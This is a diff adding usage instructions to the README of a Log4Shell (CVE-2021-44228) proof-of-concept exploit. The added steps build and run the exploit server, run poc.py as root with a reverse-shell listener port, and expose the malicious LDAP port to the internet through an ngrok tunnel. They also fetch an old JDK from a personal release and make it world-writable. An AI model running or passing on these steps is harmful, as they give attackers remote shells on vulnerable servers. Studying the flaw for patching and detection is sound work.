@@ -1,3 +1,32 @@
+# HOW TO USE
+
+make server demo  
+
+```
+docker build -t log4j-shell-poc .
+docker run --network host log4j-shell-poc
+```
+
+use script
+
+```
+wget https://github.com/VHAE04/log4j-shell-poc/releases/download/file/jdk1.8.0_20.zip
+unzip jdk1.8.0_20.zip
+sudo chmod 777 -R jdk1.8.0_20
+sudo pip install -r requirements.txt
+sudo python3 poc.py --userip localhost --webport 8000 --lport 9001
+```
+
+open wan with ngrok 
+
+```
+curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
+
+ngrok tcp 1389
+```
+
+
+
 # log4j-shell-poc
 A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
 Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.
